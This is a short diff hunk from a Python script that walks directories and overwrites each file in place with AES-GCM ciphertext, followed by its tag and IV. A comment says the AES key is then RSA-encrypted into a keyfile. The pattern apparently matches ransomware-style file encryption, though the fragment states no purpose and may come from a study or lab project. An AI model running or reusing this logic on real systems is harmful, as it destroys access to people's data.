@@ -37,8 +37,8 @@ def main():
 				contents = fin.read()
 			with open(os.path.join(root,name), "wb") as fout:
 				ciphertext = encryptor.update(contents) + encryptor.finalize()
-				fout.write(encryptor.tag);	fout.write("\n".encode())
-				fout.write(iv);	fout.write("\n".encode())
+				fout.write(encryptor.tag)
+				fout.write(iv)
 				fout.write(ciphertext)
 	
 	#Uses RSA to encrypt the AES key and store it in keyfile
